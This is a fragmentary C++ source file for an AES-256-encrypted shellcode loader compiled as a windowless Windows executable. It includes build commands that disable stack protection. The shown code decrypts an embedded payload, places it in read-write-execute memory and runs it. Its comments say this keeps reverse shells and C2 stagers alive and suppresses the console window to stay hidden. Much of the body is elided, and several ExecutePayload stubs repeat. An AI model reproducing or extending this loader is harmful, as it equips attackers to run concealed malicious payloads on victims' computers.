// ============================================================
// aes256_loader_exe.cpp — AES-256-CBC shellcode loader (EXE)
//
// Converted from the DLL/rundll32 variant into a standalone
// Windows GUI-subsystem executable. No console window is
// created at runtime.
//
// Build (MinGW-w64, from Kali):
//   x86_64-w64-mingw32-g++ -mwindows -static -s -O2 \
//       -fno-stack-protector -o aes256_loader.exe aes256_loader_exe.cpp
//
// Build (MSVC x64):
//   cl /O2 /GS- /std:c++17 aes256_loader_exe.cpp /link /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup
//
// Usage:
//   aes256_loader.exe          -> decrypts embedded payload and runs it
//   aes256_loader.exe --pause  -> wait for keypress after execution
// ============================================================
...
// ============================================================
// !! Regenerate payload.h with encrypt_aes256.py when you
//    change the key/IV or the payload.                          !!
// ============================================================
#include "payload.h"
...
// ============================================================
// Allocate RWX memory, copy shellcode, flush instruction cache
// Uses PAGE_EXECUTE_READWRITE for maximum shellcode compatibility
// (many staged payloads and C2 stagers write function pointers
//  back into their own buffer during initialization)
// ============================================================
...
static DWORD ExecutePayload(LPVOID shellcode, DWORD size) {
    ...
    // Block until shellcode thread exits.
    // For long-lived reverse shells this keeps the process alive.
...
static DWORD ExecutePayload(LPVOID shellcode, DWORD size) {
    ...
    // Keep host alive if payload spawned child threads
    Sleep(INFINITE);
    return 0;
}
#endif
...
static DWORD ExecutePayload(LPVOID shellcode, DWORD size) {
    ...
    if (!exec_mem) return 1;
    ((void(*)())exec_mem)();
    // If shellcode returns (short-lived), keep process alive
    Sleep(INFINITE);
    return 0;
}
#endif
...
// ============================================================
// EXE entry point (GUI subsystem -> no console window)
// ============================================================

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nCmdShow;

    // Optional: hold the windowless process open after a short-lived
    // payload finishes so the result stays visible when launched
    // from a console (e.g. "loader.exe --pause").
